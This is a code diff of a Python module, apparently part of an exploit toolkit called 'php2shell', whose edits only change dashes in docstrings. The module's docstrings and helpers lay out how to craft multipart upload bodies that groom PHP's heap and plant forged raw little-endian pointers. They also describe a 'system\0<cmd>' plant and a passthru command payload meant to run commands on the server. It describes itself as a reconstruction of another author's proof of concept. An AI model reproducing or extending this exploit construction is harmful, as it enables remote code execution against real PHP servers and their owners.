@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-"""Module "COMPACT" — rearm/re-grab body + final forged multipart (compact tail).
+"""Module "COMPACT": rearm/re-grab body + final forged multipart (compact tail).
 
 RECONSTRUCTED from zer061 shape docs + LEAK module spec; NOT the author's original;
 per-build semantics marked VERIFIED (mined docs) / INFERRED.
@@ -9,7 +9,7 @@ Consumed by php2shell.py attempt():
                                 requests (php2shell.py:211,242). Both exchanges
                                 are framed by php2shell.multipart_request with
                                 Cookie PHPSESSID=rearm<ordinal>{a,b}, so the
-                                bodies carry NO PHPSESSID field — the sid is a
+                                bodies carry NO PHPSESSID field; the sid is a
                                 Cookie header only (VERIFIED by framing).
   COMPACT.ARM_FILENAME_LENGTH   shared large-filename length used by both the
                                 STOCK arm (php2shell.py:185) and the rearm
@@ -23,7 +23,7 @@ Consumed by php2shell.py attempt():
                                 final_parts=116 (php2shell.py:265).
 
 Per-semantics provenance
-VERIFIED (mined docs — zer061 bundle + LEAK module + freeze_battery):
+VERIFIED (mined docs, zer061 bundle + LEAK module + freeze_battery):
   - Part grammar: --B CRLF / Content-Disposition: form-data; name="x"
     [; filename="y"] CRLF CRLF value (+ each caller appends CRLF)
     (poc0_109618.py:56-60, poc1_109619.py:48-52, php_up_framework.py:90-94);
@@ -34,19 +34,19 @@ VERIFIED (mined docs — zer061 bundle + LEAK module + freeze_battery):
     groom parameter: LEAK arm F*262144 / LEAK probe markers F*39 and F*39
     (native-output-leak.py:41-42,50).
   - The community reclaim grammar is name="t[]" FIELD parts carrying forged
-    records: 149 x t[] — "149 t[] parts are the packed natural table (nTableSize
+    records: 149 x t[], "149 t[] parts are the packed natural table (nTableSize
     256, 320-byte string bins)" (poc0_109618.py:10-11,85-88;
     poc1_109619.py:11,65-67; php_up_framework.py:113-114). Field entries beyond
     the capacitor do not touch max_file_uploads, unlike file parts.
   - FORGED-POINTER ENCODING: raw little-endian struct.pack("<Q", value) inside
-    the reclaim records — poc0_109618.py:38-53 and php_up_framework.py:70-87
+    the reclaim records: poc0_109618.py:38-53 and php_up_framework.py:70-87
     pack the call pointer at fixed record offsets; never ASCII hex strings; the
     record is then REPEATED into every reclaim part (repeater-per-part choice).
     The compact final mirrors the raw-LE choice, and mixes ASCII command bytes
     with packed pointers exactly like zero61's "system\\0<cmd>" plant
     (offset 200, poc0_109618.py:51-52).
   - Upload-progress machinery needs the USP field; the LEAK probe keeps TWO file
-    parts with F*39 filenames (native-output-leak.py:47-52) — the (n2, f1, f2)
+    parts with F*39 filenames (native-output-leak.py:47-52); the (n2, f1, f2)
     argument triple mirrors exactly that (n2=2, f1=f2=39 at the call site).
   - max_file_uploads is 20 on the measured lab stack; file parts beyond the cap
     are parsed but never uploaded; and a body > 8M aborts pre-machinery on fpm
@@ -58,10 +58,10 @@ VERIFIED (mined docs — zer061 bundle + LEAK module + freeze_battery):
     payload semantics: the passthrough command reference string
     ("passthrough-<command>", e.g. "passthrough-id"); the driver-side mode
     string is produced by command_mode() as "passthru-<command>"
-    (php2shell.py:171) — the body embeds whatever string is handed in.
+    (php2shell.py:171); the body embeds whatever string is handed in.
 
 INFERRED (choices with no direct doc statement; kept explicit for A/B on a
-real target — see also the TODO list in the final reconstruction report):
+real target, see also the TODO list in the final reconstruction report):
   - BOUNDARY value b"B7kQcompact": pattern of the zero61 family
     b"B7kQpoc618"/b"B7kQpoc619" (poc0_109618.py:64, poc1_109619.py:56).
   - ARM_FILENAME_LENGTH = 262144 == the LEAK stock-arm default
@@ -84,7 +84,7 @@ real target — see also the TODO list in the final reconstruction report):
     "lengths + repetition" groom, compact sizes 8000/6000 at the call site).
   - probe_body forged pointers are planted one raw-LE u64 t[] field each
     (target, then dso_base, then stage_delta), positioned directly after the
-    filler section and before the ordinal/payload tail — rather than one
+    filler section and before the ordinal/payload tail, rather than one
     288-byte record repeated everywhere (zero61's repeater). The raw-LE
     encoding is the mirrored choice; the one-field-per-pointer spread is
     INFERRED.
@@ -97,7 +97,7 @@ real target — see also the TODO list in the final reconstruction report):
     the author's run metadata says final_parts=116 (php2shell.py:265). The +8
     structural difference is not recoverable from the mined docs (open TODO).
 
-Size note (measured constraint — applies to every builder below):
+Size note (measured constraint, applies to every builder below):
     rearm  ~5.26 MB  (20 files F*262144 + 129 t[]"T" fillers)
     final  ~0.72 MB  (2 markers F*39 + 100 fillers cycling 8000/6000)
 both far below the 8M abort-pre-machinery budget on this stack.
@@ -133,15 +133,15 @@ def file_part(index: int, filename: bytes) -> bytes:
 
 
 def _u64(value: int) -> bytes:
-    """Raw little-endian u64 — the zero61 forge() pointer encoding."""
+    """Raw little-endian u64, the zero61 forge() pointer encoding."""
     return struct.pack("<Q", value & _U64)
 
 
 def arm_body(no_close_flag: bool, filename_length: int, parts: int) -> bytes:
     """Rearm / re-grab multipart (multipart only).
 
-    parts is the requested count of the RECLAIM WING — file parts + t[] filler
-    fields — echoed from zero61's N149 grammar ("149 t[] parts are the packed
+    parts is the requested count of the RECLAIM WING (file parts + t[] filler
+    fields), echoed from zero61's N149 grammar ("149 t[] parts are the packed
     natural table"). File parts are capped at MAX_FILE_UPLOADS (20, measured
     max_file_uploads: beyond the cap parts are parsed but never uploaded);
     every remaining entry up to `parts` is represented as a t[] filler FIELD
@@ -178,12 +178,12 @@ def probe_body(parts: int, f1: int, f2: int, field_len: int, b1: bool, n2: int,
     Byte layout top-to-bottom (part order is the byte order):
       [b1]   USP field, value b"M" * field_len
       [n2]   marker file parts, filename F*f1 (index 0) then F*f2
-             — f1=f2=39, n2=2 mirrors LEAK.probe_body's two F*39 parts exactly
+             (f1=f2=39, n2=2 mirrors LEAK.probe_body's two F*39 parts exactly)
       parts  filler file parts, name="file<n2+i>", filename F-length cycling
              s1 (even i) / s2 (odd i)
       [b2]   optional t[] spray wave (parts entries, value b"T"); OFF in the
              driver call (b2=False)
-      [always] FORGED-POINTER FIELD BLOCK — the three values packed raw
+      [always] FORGED-POINTER FIELD BLOCK, the three values packed raw
              little-endian u64 (mirrored zero61 forge() encoding), one t[]
              field per value, in order: target, dso_base, stage_delta.
              ORDER IN BYTES: immediately after the filler section, before the
@@ -193,7 +193,7 @@ def probe_body(parts: int, f1: int, f2: int, field_len: int, b1: bool, n2: int,
                t[]      <- struct.pack("<Q", stage_delta)
       [always] ordinal marker field, name=b"ord<i>", value=b"<i>"
       [b3]   payload field, name=b"payload", value=payload.encode()
-             ("passthrough-<command>" reference) — LAST content part before
+             ("passthrough-<command>" reference), LAST content part before
              the closing boundary
       [always] closing --BOUNDARY--\r\n
 
